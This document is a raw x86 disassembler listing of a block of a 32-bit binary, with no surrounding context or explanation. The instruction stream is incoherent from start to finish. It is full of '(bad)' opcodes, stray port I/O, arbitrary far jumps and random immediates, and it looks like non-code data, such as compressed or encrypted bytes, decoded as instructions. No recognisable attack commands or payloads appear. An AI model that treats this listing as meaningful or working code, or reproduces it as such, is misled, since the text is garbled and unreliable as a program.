  414b11:	lock fisubr DWORD PTR es:[esi-0x6b]
  414b16:	push   cs
  414b17:	scas   eax,DWORD PTR es:[edi]
  414b18:	mov    ah,0x52
  414b1a:	sbb    eax,0x575b60e2
  414b1f:	adc    bl,bl
  414b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b22:	es mov ecx,0x9fe03f41
  414b28:	pop    ebx
  414b29:	(bad)  
  414b2a:	mov    es:0x76285c85,al
  414b30:	or     eax,0x61939a97
  414b35:	fist   DWORD PTR [eax-0x40]
  414b38:	and    DWORD PTR [ebx],eax
  414b3a:	pop    edi
  414b3b:	cmp    BYTE PTR [edi-0x4afce0e4],0xa9
  414b42:	push   0xffffffa8
  414b44:	push   esi
  414b45:	adc    eax,0x6e0afcf1
  414b4a:	ins    BYTE PTR es:[edi],dx
  414b4b:	pop    ebx
  414b4c:	jg     0x414b0d
  414b4e:	icebp  
  414b4f:	pop    ecx
  414b50:	mov    ds:0x47ab224b,al
  414b55:	shr    DWORD PTR [ebp+0x7f839d26],0x21
  414b5c:	mov    edx,0x2dadc215
  414b61:	push   eax
  414b62:	test   BYTE PTR [ecx],dl
  414b64:	lds    esp,FWORD PTR [ecx+0x58fe027d]
  414b6a:	loope  0x414b42
  414b6c:	push   eax
  414b6d:	rcl    BYTE PTR [esi],0x7b
  414b70:	loope  0x414bc2
  414b72:	xchg   edx,eax
  414b73:	imul   edi,DWORD PTR [ebx+0x46eda58a],0xffffffcf
  414b7a:	sub    esi,DWORD PTR [ebx-0x65]
  414b7d:	and    al,0x1d
  414b7f:	push   edi
  414b80:	inc    edx
  414b81:	rol    BYTE PTR ds:0x2a7a706d,1
  414b87:	and    ch,cl
  414b89:	mov    ecx,0xdb551d88
  414b8e:	int    0x8f
  414b90:	aam    0x60
  414b92:	test   BYTE PTR [ecx-0x5b],0x85
  414b96:	test   DWORD PTR [esi],eax
  414b98:	jb     0x414ba7
  414b9a:	test   DWORD PTR [edi],edx
  414b9c:	jns    0x414b29
  414b9e:	es retf 
  414ba0:	(bad)  
  414ba1:	jbe    0x414b2c
  414ba3:	mov    bl,0x4c
  414ba5:	shr    BYTE PTR [edi-0x23],0x8d
  414ba9:	fisttp WORD PTR [esi+eiz*8-0x4a]
  414bad:	jbe    0x414b8a
  414baf:	or     bl,BYTE PTR [eax-0x80]
  414bb2:	pop    eax
  414bb3:	and    bh,ch
  414bb5:	cdq    
  414bb6:	dec    edx
  414bb7:	sbb    bl,BYTE PTR [ecx-0x4a]
  414bba:	es push ss
  414bbc:	push   ss
  414bbd:	fsubr  st(6),st
  414bbf:	jo     0x414c15
  414bc1:	adc    edi,ebp
  414bc3:	sbb    eax,0x2d6dba66
  414bc8:	adc    eax,0xf468f531
  414bcd:	ficom  WORD PTR [edx-0x77dae202]
  414bd3:	lods   eax,DWORD PTR ds:[esi]
  414bd4:	and    eax,DWORD PTR [edi+0x3d5d4d70]
  414bda:	lea    ebp,[esi-0x7833e478]
  414be0:	xor    ebp,DWORD PTR [ebp-0x69246c16]
  414be6:	fisub  DWORD PTR [ebp+0x797b3ba1]
  414bec:	pop    ss
  414bed:	jecxz  0x414bca
  414bef:	cmp    BYTE PTR [ecx-0x49517fb6],dl
  414bf5:	jbe    0x414bbc
  414bf7:	dec    ebp
  414bf8:	into   
  414bf9:	push   esi
  414bfa:	push   ebx
  414bfb:	in     al,dx
  414bfc:	fs inc edi
  414bfe:	pop    ss
  414bff:	or     bh,BYTE PTR [ebx]
  414c01:	stos   BYTE PTR es:[edi],al
  414c02:	mov    ebp,0x6e1fb8db
  414c07:	sbb    bl,BYTE PTR [esi+esi*4]
  414c0a:	ss clc 
  414c0c:	loop   0x414b99
  414c0e:	and    BYTE PTR [ecx],ah
  414c10:	add    ch,BYTE PTR [ebx-0x4a]
  414c13:	push   ss
  414c14:	fist   WORD PTR [esi+0x57]
  414c17:	jne    0x414bf4
  414c19:	xor    BYTE PTR [esi+0x59],0xbc
  414c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c1e:	(bad)  
  414c20:	xchg   esp,eax
  414c21:	mov    ch,0x5
  414c23:	fcmovnb st,st(2)
  414c25:	mov    dl,0x1c
  414c27:	ret    0xd2fb
  414c2a:	fistp  WORD PTR [esi+edx*8+0x56]
  414c2e:	fild   DWORD PTR [eax]
  414c30:	dec    edi
  414c31:	test   DWORD PTR [esi-0x80],0x85e5e228
  414c38:	fcmovnb st,st(2)
  414c3a:	ret    0x4fa4
  414c3d:	les    eax,FWORD PTR [esi*2+0x55afb63e]
  414c44:	in     eax,dx
  414c45:	(bad)  
  414c46:	(bad)  
  414c47:	mov    dh,0x69
  414c49:	imul   ebx,DWORD PTR [edi-0x66e5fabf],0x44
  414c50:	sahf   
  414c51:	imul   esi,DWORD PTR [esi+0x310ba5b5],0x2a
  414c58:	cs loopne 0x414c2e
  414c5b:	inc    edi
  414c5c:	xchg   edx,eax
  414c5d:	mov    ecx,DWORD PTR [edi-0x1545dd4b]
  414c63:	jae    0x414c9a
  414c65:	mov    ecx,DWORD PTR [esi]
  414c67:	xor    eax,0x2dc96aad
  414c6c:	gs pop ds
  414c6e:	adc    al,0xc5
  414c70:	ds ret 0xb6d
  414c74:	push   0xd166e540
  414c79:	mov    esp,0xb656db96
  414c7e:	not    DWORD PTR [ebx-0x1d]
  414c81:	pop    esp
  414c82:	scas   al,BYTE PTR es:[edi]
  414c83:	sbb    ah,dl
  414c85:	push   edi
  414c86:	loopne 0x414c42
  414c88:	ins    DWORD PTR es:[edi],dx
  414c89:	sub    al,0x34
  414c8b:	sbb    BYTE PTR [eax+esi*4-0x3479c616],dl
  414c92:	daa    
  414c93:	mov    dh,0xdd
  414c95:	push   0x4eefdf80
  414c9a:	aad    0x3f
  414c9c:	inc    edi
  414c9d:	dec    esi
  414c9e:	pop    ss
  414c9f:	ins    BYTE PTR es:[edi],dx
  414ca0:	pop    ss
  414ca1:	fdiv   DWORD PTR [esi-0x17fdbef8]
  414ca7:	or     ebp,esi
  414ca9:	rcl    BYTE PTR [esi+0x3b],1
  414cac:	push   0xffffffab
  414cae:	je     0x414c5b
  414cb0:	mov    ds:0x8b8f1993,eax
  414cb5:	js     0x414ccb
  414cb7:	sbb    cl,BYTE PTR [ebx]
  414cb9:	lods   eax,DWORD PTR ds:[esi]
  414cba:	push   ebx
  414cbb:	out    dx,al
  414cbc:	push   0x163668f6
  414cc1:	or     bl,BYTE PTR [ebx]
  414cc3:	outs   dx,BYTE PTR ds:[esi]
  414cc4:	pop    edi
  414cc5:	sar    DWORD PTR [edi+0x5b],cl
  414cc8:	iret   
  414cc9:	mov    ah,0x5b
  414ccb:	or     BYTE PTR [esi],bl
  414ccd:	(bad)  
  414ccf:	xchg   ebx,eax
  414cd0:	jl     0x414d0a
  414cd2:	xlat   BYTE PTR ds:[ebx]
  414cd3:	shl    DWORD PTR [edx-0x4a],0xdd
  414cd7:	mov    dh,0x6d
  414cd9:	aas    
  414cda:	fidivr DWORD PTR [ebx]
  414cdc:	or     esi,DWORD PTR [ebx-0x37d302ce]
  414ce2:	cmc    
  414ce3:	or     esi,DWORD PTR [esi-0x6e3a0e2b]
  414ce9:	pop    edx
  414cea:	fimul  DWORD PTR [ecx]
  414cec:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  414cee:	or     eax,0x8ab6d198
  414cf3:	test   DWORD PTR [edx],esp
  414cf5:	sbb    eax,0xb844cefc
  414cfa:	mov    cl,0xb0
  414cfc:	mov    al,0xf3
  414cfe:	(bad)  
  414cff:	dec    ecx
  414d00:	imul   edx,DWORD PTR [ebp+ebp*4+0x53ee59ba],0x18aedb00
  414d0b:	retf   0x32f6
  414d0e:	xor    BYTE PTR [ebp-0x18],0x42
  414d12:	mov    ebx,0x80755a40
  414d17:	jnp    0x414d75
  414d19:	adc    edi,DWORD PTR [ecx+edx*4-0x5c247a92]
  414d20:	out    dx,al
  414d21:	(bad)  
  414d22:	jb     0x414da1
  414d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d25:	mov    bl,0xe6
  414d27:	dec    eax
  414d28:	jno    0x414d8b
  414d2a:	imul   ecx,DWORD PTR [eax+0x301d99cd],0x16
  414d31:	cmp    eax,0xd0a95bbd
  414d36:	adc    dh,bh
  414d38:	lock test DWORD PTR [ebp+0x6c6ce189],ebx
  414d3f:	in     eax,0xb
  414d41:	jns    0x414d21
  414d43:	add    BYTE PTR [ebx],dl
  414d45:	mov    al,ds:0xc890c965
  414d4a:	adc    al,0xbb
  414d4c:	sub    BYTE PTR [esi],0x70
  414d4f:	pandn  mm1,QWORD PTR [ebx+0xb8d0911]
  414d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d57:	sbb    eax,0xb04f0490
  414d5c:	pop    ebx
  414d5d:	cmp    al,0xf9
  414d5f:	and    al,0x74
  414d61:	inc    ecx
  414d62:	dec    ebx
  414d63:	push   ebp
  414d64:	mov    edx,ds
  414d66:	xor    bh,BYTE PTR [ebp+esi*4-0x36bd2fa3]
  414d6d:	in     eax,0x26
  414d6f:	push   esi
  414d70:	int    0xef
  414d72:	or     ecx,DWORD PTR [ebx]
  414d74:	pop    ebx
  414d75:	mov    ebx,0xd43538ce
  414d7a:	dec    edx
  414d7b:	(bad)  
  414d7d:	test   eax,0x10b01537
  414d82:	mov    ch,0x8d
  414d84:	inc    eax
  414d85:	jb     0x414d1b
  414d87:	retf   
  414d88:	(bad)  
  414d89:	fnstenv [ecx+0x740746d]
  414d8f:	and    DWORD PTR [ebp+0x7],ebx
  414d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d93:	lea    edx,[edi-0x4c]
  414d96:	add    edi,DWORD PTR [eax-0x58d67b37]
  414d9c:	xor    BYTE PTR [ecx-0x1b],0x2e
  414da0:	adc    BYTE PTR [eax],bh
  414da2:	push   0xe94f79d0
  414da7:	loopne 0x414d4e
  414da9:	shr    BYTE PTR [ebp+0x33],1
  414dac:	ror    DWORD PTR [edi-0x67d6beae],1
  414db2:	test   DWORD PTR [eax+0x47688604],ecx
  414db8:	push   ecx
  414db9:	ins    DWORD PTR es:[edi],dx
  414dba:	and    cl,BYTE PTR [eax-0x491dd940]
  414dc0:	fwait
  414dc1:	mov    cl,0xe0
  414dc3:	mov    edi,0xa95c2091
  414dc8:	mov    dh,0x86
  414dca:	fiadd  DWORD PTR [ebp+0x16]
  414dcd:	clc    
  414dce:	add    DWORD PTR [ecx+0x75],ecx
  414dd1:	cmp    al,bl
  414dd3:	fidiv  DWORD PTR [esi+0x5b]
  414dd6:	pop    edx
  414dd7:	mov    edx,0x4108e5a4
  414ddc:	push   eax
  414ddd:	ret    0x71e0
  414de0:	imul   eax,DWORD PTR [ebx],0x11
  414de3:	mov    bh,0x4c
  414de5:	xor    eax,0xc46da4ca
  414dea:	hlt    
  414deb:	inc    edx
  414dec:	fist   DWORD PTR [ebp+esi*8-0x59]
  414df0:	stc    
  414df1:	mov    edi,0xf7ad1f18
  414df6:	test   eax,0xc7fcad85
  414dfb:	test   eax,0x443dcd00
  414e00:	je     0x414e45
  414e02:	inc    eax
  414e03:	add    ebp,DWORD PTR [edx]
  414e05:	dec    esp
  414e06:	les    esp,FWORD PTR [ebp-0x42]
  414e09:	in     eax,dx
  414e0a:	sbb    DWORD PTR [edi+0x71],eax
  414e0d:	pop    eax
  414e0e:	xor    BYTE PTR [esi],0x35
  414e11:	xchg   ebp,eax
  414e12:	lods   eax,DWORD PTR ds:[esi]
  414e13:	fcom   st(3)
  414e15:	inc    ecx
  414e16:	jo     0x414e21
  414e18:	xor    BYTE PTR [eax-0x720e1ec9],bh
  414e1e:	scas   al,BYTE PTR es:[edi]
  414e1f:	stos   BYTE PTR es:[edi],al
  414e20:	dec    ebp
  414e21:	(bad)  
  414e22:	fnstcw WORD PTR [esi]
  414e24:	cli    
  414e25:	cmc    
  414e26:	rol    BYTE PTR [edx],0xd1
  414e29:	adc    ah,al
  414e2b:	lods   al,BYTE PTR ds:[esi]
  414e2c:	cmp    eax,0x6a6848
  414e31:	ror    BYTE PTR [ebp+0x27c50185],0x48
  414e38:	sbb    eax,0xdb7cb050
  414e3d:	xor    ch,dh
  414e3f:	jmp    0xf141ee79
  414e44:	push   eax
  414e45:	fs mov dh,0xcb
  414e48:	ret    0x52d6
  414e4b:	add    eax,0xedcd814d
  414e50:	pop    ss
  414e51:	add    eax,0x85d179c8
  414e56:	xchg   BYTE PTR [edx],ah
  414e58:	push   ss
  414e59:	inc    esp
  414e5a:	popa   
  414e5b:	nop
  414e5c:	xchg   ecx,eax
  414e5d:	inc    esi
  414e5e:	pop    ecx
  414e5f:	pusha  
  414e60:	push   edi
  414e61:	push   eax
  414e62:	lds    ebx,FWORD PTR [ecx+0x5dd8310c]
  414e68:	adc    eax,0xef4cd41b
  414e6d:	sbb    al,0x12
  414e6f:	sbb    DWORD PTR [ecx+0x7],ebp
  414e72:	sub    eax,0x5242b251
  414e77:	jbe    0x414dfd
  414e79:	outs   dx,BYTE PTR ds:[esi]
  414e7a:	jbe    0x414ed7
  414e7c:	sub    BYTE PTR [eax+0x77],dl
  414e7f:	(bad)  
  414e80:	cli    
  414e81:	xor    cl,BYTE PTR [eax+0x45]
  414e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e85:	adc    al,0xa
  414e87:	test   DWORD PTR [ebp+0x5ac18d74],esp
  414e8d:	mov    ch,0xa0
  414e8f:	pusha  
  414e90:	fld    TBYTE PTR [esi]
  414e92:	mov    ds:0x982f5706,eax
  414e97:	pop    edi
  414e98:	inc    ecx
  414e99:	mov    DWORD PTR [edx-0x57],ebp
  414e9c:	in     eax,dx
  414e9d:	lods   eax,DWORD PTR ds:[esi]
  414e9e:	sub    eax,0x88ade075
  414ea3:	test   BYTE PTR [ebx-0x65],bl
  414ea6:	call   0xc1049ded
  414eab:	rol    BYTE PTR [eax-0x34abe316],cl
  414eb1:	test   DWORD PTR [esi],esi
  414eb3:	pop    edx
  414eb4:	xchg   edi,eax
  414eb5:	out    0xdd,eax
  414eb7:	fcmovbe st,st(4)
  414eb9:	std    
  414eba:	arpl   WORD PTR [esi],dx
  414ebc:	fisubr DWORD PTR [ebp+0x6b]
  414ebf:	gs add eax,0x8e1a7f0
  414ec5:	pop    esp
  414ec6:	cmp    bh,BYTE PTR [ebx-0x49249deb]
  414ecc:	push   0xffffff89
  414ece:	mov    edi,0x3f7c8f8d
  414ed3:	sub    ah,al
  414ed5:	mov    dh,0x2d
  414ed7:	sbb    eax,0xa73e685c
  414edc:	pop    eax
  414edd:	fdiv   DWORD PTR [esi-0x893948a]
  414ee3:	inc    eax
  414ee4:	sbb    ecx,DWORD PTR [esi+ebp*2]
  414ee7:	or     esp,esi
  414ee9:	arpl   WORD PTR [ecx-0x5f],bx
  414eec:	fdivr  DWORD PTR [esi-0x23]
  414eef:	sbb    esp,DWORD PTR ss:[edi+0x8]
  414ef3:	(bad)  
  414ef4:	repnz hlt 
  414ef6:	bswap  esp
  414ef8:	loopne 0x414eaf
  414efa:	pop    ebp
  414efb:	fcomp  DWORD PTR [edx]
  414efd:	mov    al,ds:0xaacb011e
  414f02:	pop    es
  414f03:	out    dx,al
  414f04:	les    edx,FWORD PTR [ecx-0x49]
  414f07:	mov    dh,0xad
  414f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f0a:	and    dl,0x23
  414f0d:	sbb    al,0xdf
  414f0f:	fiadd  DWORD PTR [ecx+0x752e2aed]
  414f15:	sub    eax,0x24e33214
  414f1a:	xchg   esi,eax
  414f1b:	cdq    
  414f1c:	jmp    0x414f60
  414f1e:	xor    al,0x14
  414f20:	mov    cl,0x2c
  414f22:	cmc    
  414f23:	dec    edi
  414f24:	inc    ecx
  414f25:	mov    edx,0xb746ca05
  414f2a:	ja     0x414f68
  414f2c:	mov    dh,0x31
  414f2e:	xchg   edx,eax
  414f2f:	or     al,0x36
  414f31:	mov    dh,0x8d
  414f33:	test   DWORD PTR [ebx],esp
  414f35:	aaa    
  414f36:	inc    ebp
  414f37:	test   BYTE PTR [edx-0x33b128fb],0x41
  414f3e:	stc    
  414f3f:	ins    DWORD PTR es:[edi],dx
  414f40:	(bad)  ds:0x59bf891c
  414f46:	inc    edx
  414f47:	add    BYTE PTR [eax],0x2f
  414f4a:	sbb    BYTE PTR [ecx+0x71b4b8d5],dh
  414f50:	jno    0x414f90
  414f52:	or     DWORD PTR [edx-0x13],0x1
  414f56:	sub    DWORD PTR [ecx-0x35],esp
  414f59:	shl    DWORD PTR [esi-0x1979f125],0x44
  414f60:	rcl    BYTE PTR [ecx-0x49f7e518],1
  414f66:	pusha  
  414f67:	daa    
  414f68:	jg     0x414fbb
  414f6a:	xlat   BYTE PTR ds:[ebx]
  414f6b:	mov    WORD PTR [ebp-0x26],ds
  414f6e:	fcom   DWORD PTR [esi]
  414f70:	dec    esp
  414f71:	pusha  
  414f72:	or     BYTE PTR [ebx-0x322e2d8b],al
  414f78:	aam    0xb4
  414f7a:	in     eax,dx
  414f7b:	repnz lods eax,DWORD PTR ds:[esi]
  414f7d:	xlat   BYTE PTR ds:[ebx]
  414f7e:	cmc    
  414f7f:	in     al,0x34
  414f81:	add    BYTE PTR [ebx],ah
  414f83:	mov    ds:0xa4b31dca,eax
  414f88:	mov    ds:0x3556b70,eax
  414f8d:	(bad)  
  414f8e:	jae    0x41500f
  414f90:	and    eax,0x6b6aa130
  414f95:	push   0xffffffdb
  414f97:	shl    bh,cl
  414f99:	lds    esp,FWORD PTR [ebx-0x4d24bab4]
  414f9f:	mov    ch,0xf9
  414fa1:	and    bl,dl
  414fa3:	sub    ebp,ebx
  414fa5:	lods   eax,DWORD PTR ds:[esi]
  414fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa7:	(bad)  [esi]
  414fa9:	or     dh,BYTE PTR [esi]
  414fab:	je     0x414f87
  414fad:	in     al,0xe5
  414faf:	int3   
  414fb0:	fs das 
  414fb2:	fild   WORD PTR [ecx]
  414fb4:	cs jne 0x41500b
  414fb7:	mov    dl,0x1b
  414fb9:	fstp   st(1)
  414fbb:	xchg   DWORD PTR [ebx-0x55],eax
  414fbe:	mov    dh,0x4d
  414fc0:	mov    cl,0xbb
  414fc2:	std    
  414fc3:	xchg   esp,eax
  414fc4:	xlat   BYTE PTR ds:[ebx]
  414fc5:	xchg   BYTE PTR [edi-0x2e],dh
  414fc8:	hlt    
  414fc9:	push   edi
  414fca:	add    DWORD PTR [edi+0x3ee863b6],esi
  414fd0:	jge    0x414fec
  414fd2:	inc    ecx
  414fd3:	imul   ebx,ebx,0x5146c6c2
  414fd9:	outs   dx,DWORD PTR ds:[esi]
  414fda:	call   0x97f8:0x64dfa475
  414fe1:	push   esi
  414fe2:	fsubr  DWORD PTR [esi]
  414fe4:	sbb    ecx,DWORD PTR [edx+0x2c6d3df4]
  414fea:	sti    
  414feb:	fcomp  QWORD PTR [ecx-0x48]
  414fee:	ins    DWORD PTR es:[edi],dx
  414fef:	pop    ebx
  414ff0:	in     eax,dx
  414ff1:	push   ds
  414ff2:	aas    
  414ff3:	es and eax,0xdda0ad54
  414ff9:	pop    ds
  414ffa:	pop    edx
  414ffb:	ins    DWORD PTR es:[edi],dx
  414ffc:	xchg   edi,eax
  414ffd:	cmp    ah,BYTE PTR [eax-0x58f7f2c2]
  415003:	push   eax
  415004:	shl    DWORD PTR [ebx],1
  415006:	mov    al,0xd5
  415008:	push   esp
  415009:	mov    cl,0x4a
  41500b:	(bad)  
  41500c:	mov    esi,0xe8d349cb
  415011:	sub    BYTE PTR [esi],0x2c
  415014:	xorps  xmm0,XMMWORD PTR [ebp-0x60c40f05]
  41501b:	pop    ebp
  41501c:	inc    esp
  41501d:	(bad)  
  41501f:	pusha  
  415020:	jb     0x414fc8
  415022:	pop    esi
  415023:	(bad)  
  415024:	mov    al,0xb
  415026:	add    eax,0x2e8a0edb
  41502b:	xchg   ebx,eax
  41502c:	jne    0x415020
  41502e:	outs   dx,BYTE PTR ds:[esi]
  41502f:	and    al,0x80
  415031:	pop    eax
  415032:	fdiv   DWORD PTR [esi-0x6b]
  415035:	mov    ebp,0xa39be6cc
  41503a:	out    0x11,al
  41503c:	(bad)  
  41503e:	mov    edx,0x31b9e2c7
  415043:	xchg   esp,eax
  415044:	jo     0x414fe0
  415046:	inc    ebx
  415047:	mov    cl,0x21
  415049:	ss daa 
  41504b:	sbb    ecx,ecx
  41504d:	ret    
  41504e:	stos   DWORD PTR es:[edi],eax
  41504f:	idiv   edi
  415051:	adc    DWORD PTR [ebx+0x34],ecx
  415054:	pop    edx
  415055:	push   ebx
  415056:	or     esi,DWORD PTR [edi]
  415058:	inc    esi
  415059:	push   0x22
  41505b:	mov    dh,0x4b
  41505d:	dec    ebp
  41505e:	aad    0x4e
  415060:	lds    esp,FWORD PTR [esi-0x555704b4]
  415066:	fcmovu st,st(0)
  415068:	jmp    0x4bed:0xb152c1a9
  41506f:	push   0x74511b6c
  415074:	das    
  415075:	jb     0x415066
  415077:	xchg   ebx,eax
  415078:	push   esp
  415079:	mov    DWORD PTR [ebp-0x57],ebp
  41507c:	frstor [esi+0x2]
  41507f:	xor    esp,edx
  415081:	ja     0x415094
  415083:	mov    ecx,0xb6d6a069
  415088:	or     eax,0x5be77970
  41508d:	sub    ah,ch
  41508f:	clc    
  415090:	and    bl,BYTE PTR [edx]
  415092:	push   ebx
  415093:	cs ins BYTE PTR es:[edi],dx
  415095:	(bad)  
  415096:	fcmovnu st,st(1)
  415098:	sub    DWORD PTR [edi+0x309827c2],esp
  41509e:	push   edx
  41509f:	add    eax,0x1b0aabb5
  4150a4:	stos   BYTE PTR es:[edi],al
  4150a5:	jg     0x41508f
  4150a7:	fdiv   QWORD PTR [ecx]
  4150a9:	ins    DWORD PTR es:[edi],dx
  4150aa:	sbb    ch,BYTE PTR [eax]
  4150ac:	mov    dh,0x5b
  4150ae:	rcl    DWORD PTR [eax],1
  4150b0:	cmp    al,0x20
  4150b2:	sbb    BYTE PTR [edi-0x36],bh
  4150b5:	lea    esi,[esi+0x8b5b76d]
  4150bb:	(bad)  
  4150bc:	xchg   ebp,eax
  4150bd:	adc    edi,0xa1723b5d
  4150c3:	sub    eax,0xeb13dadc
  4150c8:	dec    ebp
  4150c9:	sub    al,0x61
  4150cb:	mov    edi,0x7c3b44df
  4150d0:	rcl    BYTE PTR [ecx+eax*8],1
  4150d3:	jbe    0x41508b
  4150d5:	stos   BYTE PTR es:[edi],al
  4150d6:	dec    ebp
  4150d7:	adc    BYTE PTR [ecx+0x5b6db6ab],bh
  4150dd:	mov    ebx,0xaaf58f91
  4150e2:	shl    BYTE PTR ds:[ecx+0xa],1
  4150e6:	push   esi
  4150e7:	bound  ebp,QWORD PTR [ebx+ebx*8]
  4150ea:	(bad)  
  4150eb:	push   edx
  4150ec:	ror    DWORD PTR [ebp+0x45],1
  4150ef:	mov    edx,0x40a15efc
  4150f4:	shl    DWORD PTR [eax-0x3bbe97a6],1
  4150fa:	and    BYTE PTR [ebp+eiz*4-0x73],bh
  4150fe:	es mov eax,0xa75a3ce1
  415104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415105:	fsub   DWORD PTR [esi]
  415107:	jmp    0x8dcf0743
  41510c:	call   0x28d1:0x2bf0769c
  415113:	inc    edx
  415114:	fs rcr ch,cl
  415117:	bound  eax,QWORD PTR [ebx-0x6092fef2]
  41511d:	and    DWORD PTR [eax-0x2493ebfc],ebp
  415123:	lods   eax,DWORD PTR ds:[esi]
  415124:	in     al,dx
  415125:	aam    0xa7
  415127:	mov    DWORD PTR [ebp+eax*1-0x6b],esi
  41512b:	fs sub eax,0x720d6c2d
  415131:	pop    ss
  415132:	inc    esp
  415133:	in     eax,0x25
  415135:	scas   al,BYTE PTR es:[edi]
  415136:	or     ebx,DWORD PTR [ebp-0x4b32776a]
  41513c:	aam    0xa
  41513e:	cmc    
  41513f:	push   eax
  415140:	aas    
  415141:	inc    edi
  415142:	repnz or esi,DWORD PTR [edi-0x65d764a]
  415149:	lock adc al,0x8
  41514c:	out    dx,eax
  41514d:	cli    
  41514e:	inc    ebx
  41514f:	lods   al,BYTE PTR ds:[esi]
  415150:	sub    al,0x1b
  415152:	dec    ebp
  415153:	add    eax,0xb93ebd7
  415158:	adc    al,0x40
  41515a:	mov    cl,0x6d
  41515c:	sub    al,0xc7
  41515e:	jl     0x4151cc
  415160:	sbb    BYTE PTR [edx+eiz*2],ch
  415163:	inc    esi
  415164:	add    edx,eax
  415166:	lods   eax,DWORD PTR ds:[esi]
  415167:	add    al,0x65
  415169:	xor    dl,BYTE PTR [ebx+ecx*1]
  41516c:	enter  0x811e,0x88
  415170:	or     esp,ebp
  415172:	aam    0x3b
  415174:	pop    eax
  415175:	shl    BYTE PTR ds:0xc04db6ec,0xad
  41517c:	cmp    dl,BYTE PTR [edi]
  41517e:	pop    edx
  41517f:	inc    ebp
  415180:	mov    ss,WORD PTR [esi]
  415182:	pop    eax
  415183:	pop    ecx
  415184:	add    DWORD PTR ds:0x9002eb74,edx
  41518a:	in     al,0x5
  41518c:	sub    eax,ebp
  41518e:	sub    al,0xb0
  415190:	rcr    dl,1
  415192:	popa   
  415193:	sbb    BYTE PTR [edi+0x28],bl
  415196:	jbe    0x415131
  415198:	mov    edx,0x81b1586
  41519d:	xor    BYTE PTR cs:0xa6ed0b41,0xc6
  4151a5:	mov    dh,0x50
  4151a7:	inc    edi
  4151a8:	push   esi
  4151a9:	test   DWORD PTR [eax-0x60e8a321],eax
  4151af:	sub    edx,DWORD PTR [ebp+0x6d]
  4151b2:	loope  0x415163
  4151b4:	mov    esi,0x2d32627e
  4151b9:	outs   dx,BYTE PTR ds:[esi]
  4151ba:	shr    BYTE PTR [edx],1
  4151bc:	fisubr DWORD PTR [ebp+0x30]
  4151bf:	push   0xcfdd0aef
  4151c4:	fst    st(6)
  4151c6:	push   esi
  4151c7:	mov    eax,0xa6eb313
  4151cc:	xor    eax,0x8f1e6736
  4151d1:	mov    ebp,0x1036aa1
  4151d6:	add    DWORD PTR [ebx+0x6b],ebx
  4151d9:	add    DWORD PTR [eax-0x40482d13],ebp
  4151df:	xor    eax,0xa2264dec
  4151e4:	scas   al,BYTE PTR es:[edi]
  4151e5:	mov    edi,0xb76a5bef
  4151ea:	cmp    cl,al
  4151ec:	out    0x3d,eax
  4151ee:	shl    DWORD PTR [ebp+0x5],0x2c
  4151f2:	mov    al,0x20
  4151f4:	mov    dh,0x75
  4151f6:	aad    0x6d
  4151f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151f9:	out    dx,eax
  4151fa:	xchg   edi,eax
  4151fb:	(bad)  
  4151fc:	jns    0x415258
  4151fe:	dec    ebp
  4151ff:	jbe    0x415199
  415201:	shr    BYTE PTR [esi],1
  415203:	mov    ch,0xdb
  415205:	aaa    
  415206:	fidivr DWORD PTR [esi+0x32]
  415209:	xor    DWORD PTR ds:0x96a429de,0xffffff96
  415210:	mov    dh,0x56
  415212:	mov    bl,0x5f
  415214:	repnz retf 
  415216:	mov    dl,0xfe
  415218:	or     BYTE PTR [esp+ebp*2+0x18],ch
  41521c:	fadd   DWORD PTR [esi+0x44b0321]
  415222:	arpl   WORD PTR [eax+0x6c6ed6d2],sp
  415228:	mov    ah,0xee
  41522a:	pop    edx
  41522b:	ror    BYTE PTR [ebx-0x3d5c0ac8],cl
  415231:	imul   esp,DWORD PTR [ecx+0x354be229],0x3b2efa27
  41523b:	retf   
  41523c:	ficom  DWORD PTR [eax+esi*2+0x61]
  415240:	outs   dx,DWORD PTR ds:[esi]
  415241:	jbe    0x415255
  415243:	sbb    DWORD PTR [edi],edx
  415245:	adc    esp,DWORD PTR [edx-0x293ae5ca]
  41524b:	test   DWORD PTR [esi+eiz*2+0x6a3c4eb9],ecx
  415252:	fistp  DWORD PTR [eax-0x28]
  415255:	xor    eax,0x8af07ff1
  41525a:	rol    BYTE PTR [ecx-0xc],1
  41525d:	ins    DWORD PTR es:[edi],dx
  41525e:	push   eax
  41525f:	sub    eax,0x151f1fb4
  415264:	cmp    BYTE PTR [ebp*2+0x653d142b],0x74
  41526c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41526d:	pop    esp
  41526f:	add    eax,0xaa969410
  415274:	mov    edx,DWORD PTR [edx+edx*1+0x50]
  415278:	push   ss
  415279:	fisubr DWORD PTR [ebp-0x4f2852d3]
  41527f:	pop    edi
  415280:	dec    ebp
  415281:	mov    ?,WORD PTR [edi+0x4b046c82]
  415287:	inc    ecx
  415288:	add    eax,esi
  41528a:	mov    ebp,0x2c2ed0b4
  41528f:	je     0x41524f
  415291:	xchg   ebx,eax
  415292:	or     ch,BYTE PTR [ebx-0x54]
  415295:	fmul   QWORD PTR ds:0xb0bb6d2f
  41529b:	mov    cl,0xf7
  41529d:	cdq    
  41529e:	jnp    0x415297
  4152a0:	xor    DWORD PTR [eax+0x58],ebx
  4152a3:	jp     0x4152eb
  4152a5:	shr    DWORD PTR [ebp+0x2c],1
  4152a8:	sub    eax,0xcd089eb4
  4152ad:	(bad)  
  4152ae:	cmp    BYTE PTR [edi+0x3],cl
  4152b1:	das    
  4152b2:	pop    ss
  4152b3:	sub    BYTE PTR [ebp-0x48],bh
  4152b6:	fwait
  4152b7:	cwde   
  4152b8:	int    0xee
  4152ba:	fild   QWORD PTR [eax+0x5]
  4152bd:	in     al,0x7b
  4152bf:	popa   
  4152c0:	jne    0x415263
  4152c2:	jno    0x4152ef
  4152c4:	cmp    esp,DWORD PTR [esp+edi*4-0x13]
  4152c8:	mov    esi,0x600a5377
